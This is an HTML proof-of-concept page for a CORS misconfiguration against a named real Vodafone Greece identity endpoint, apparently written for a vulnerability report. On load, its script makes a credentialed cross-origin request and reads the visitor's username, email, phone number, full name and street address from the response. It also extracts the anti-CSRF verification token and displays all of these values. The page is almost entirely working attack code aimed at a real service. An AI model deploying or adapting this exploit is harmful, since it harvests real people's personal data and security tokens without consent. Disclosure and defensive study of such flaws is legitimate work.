<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Full Data Exfiltration PoC - Vodafone Innovus</title>
    <style>
        :root { --voda-red: #e60000; --dark: #111; }
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; padding: 20px; color: var(--dark); }
        .container { max-width: 1000px; margin: auto; background: #fff; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); overflow: hidden; }
        .header { background: var(--voda-red); color: #fff; padding: 20px; text-align: center; }
        .content { padding: 30px; }
        .data-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; }
        .field-box { background: #f8f9fa; border: 1px solid #ddd; padding: 12px; border-radius: 6px; }
        .label { font-size: 12px; color: #666; text-transform: uppercase; font-weight: bold; }
        .value { color: var(--voda-red); font-family: monospace; font-size: 15px; word-break: break-all; }
        .token-area { margin-top: 20px; background: #222; color: #0f0; padding: 15px; border-radius: 6px; font-size: 12px; }
        .badge { background: #ff0000; color: white; padding: 5px 15px; border-radius: 20px; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1>Full Account Data Leakage</h1>
        <span class="badge">VULNERABILITY DETECTED</span>
    </div>
    
    <div class="content">
        <h3>Exfiltrated Personal Identifiable Information (PII):</h3>
        <div id="loader">Attempting to bypass CORS and exfiltrate data...</div>
        
        <div id="results" class="data-grid" style="display:none;">
            </div>

        <div id="token-section" style="display:none;">
            <h3>Security & Authentication Tokens:</h3>
            <div class="token-area">
                <strong>__RequestVerificationToken:</strong><br>
                <span id="final-token"></span>
            </div>
        </div>
    </div>
</div>

<script>
    const target = "https://identity.facilitymanagement.iot.vodafone.gr/identity/Manage";

    async function startDoom() {
        try {
            const res = await fetch(target, { method: 'GET', credentials: 'include' });
            const html = await res.text();
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');

            // قائمة الحقول المطلوب سحبها بناءً على الـ IDs والـ Names في صفحة فودافون
            const fields = [
                { label: "Username", id: "Username" },
                { label: "Email", id: "Email" },
                { label: "Phone Number", id: "PhoneNumber" },
                { label: "Full Name", id: "Name" },
                { label: "Website URL", id: "Website" },
                { label: "Profile URL", id: "Profile" },
                { label: "Street Address", id: "StreetAddress" },
                { label: "City", id: "Locality" },
                { label: "Region", id: "Region" },
                { label: "Postal Code", id: "PostalCode" },
                { label: "Country", id: "Country" }
            ];

            const resultsContainer = document.getElementById('results');
            document.getElementById('loader').style.display = 'none';
            resultsContainer.style.display = 'grid';

            fields.forEach(field => {
                const element = doc.getElementById(field.id) || doc.querySelector(`input[name="${field.id}"]`);
                const val = element ? element.value : "NOT_SET";
                
                const box = document.createElement('div');
                box.className = 'field-box';
                box.innerHTML = `<div class="label">${field.label}</div><div class="value">${val || 'Empty'}</div>`;
                resultsContainer.appendChild(box);
            });

            
            const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;
            if (token) {
                document.getElementById('token-section').style.display = 'block';
                document.getElementById('final-token').innerText = token;
            }

        } catch (e) {
            document.getElementById('loader').innerText = "Error: " + e.message;
        }
    }

    window.onload = startDoom;
</script>

</body>
</html>
